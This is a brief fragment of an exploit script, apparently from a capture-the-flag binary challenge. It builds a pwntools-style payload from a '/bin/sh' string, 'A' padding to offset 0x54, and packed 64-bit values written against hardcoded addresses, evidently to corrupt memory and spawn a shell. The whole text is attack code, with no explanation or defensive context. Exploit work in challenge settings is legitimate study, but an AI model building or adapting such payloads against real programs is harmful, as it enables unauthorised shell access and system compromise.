...
exp= b"/bin/sh\x00" + b"A"*(0x54-len(b"/bin/sh\x00")) + p64(addr) + p64(0x0000000000404578) \
+ p64(addr) + p64(0x0000000000404580) \
+ p64(0) + p64(0x0000000000404588) \
+ p64(0) + p64(0x00000000004045b8) \
+ p64(0xdd) + p64(0x00000000004045d0)
